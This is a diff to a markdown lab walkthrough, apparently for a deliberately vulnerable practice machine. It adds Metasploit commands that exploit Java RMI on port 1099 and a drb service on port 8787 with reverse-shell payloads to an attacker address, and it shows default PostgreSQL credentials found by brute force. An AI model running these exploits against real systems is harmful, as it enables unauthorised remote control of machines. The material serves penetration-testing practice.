@@ -81,8 +81,31 @@ whoami
 
 </details>
 
-Port 5432 PostgreSQL
+Port 1099 java-RMI
 
+<details>
+<summary>Solution</summary>
+
+```markdown
+use exploit/multi/misc/java_rmi_server
+
+set RHOST 10.0.0.3
+
+set payload java/meterpreter/reverse_tcp
+
+set LHOST 10.0.0.2
+
+exploit
+```
+
+To verify:
+```markdown
+getuid
+```
+
+</details>
+
+Port 5432 PostgreSQL
 
 <details>
 <summary>Solution</summary>
@@ -101,7 +124,34 @@ run
 
 The result of the brute force attack:
 
+
 ```markdown
 Success: postgres:postgres (Database 'template1' succeeded.)
 ```
+</details>
+
+Port 8787 drb
+
+<details>
+<summary>Solution</summary>
+
+```markdown
+use exploit/linux/misc/drb_remote_codeexec
+
+set URI druby://10.0.0.3:8787
+
+set payload cmd/unix/reverse
+
+set LHOST 10.0.0.2
+
+exploit
+```
+
+
+To verify our access: 
+
+```markdown
+whoami
+```
+
 </details>
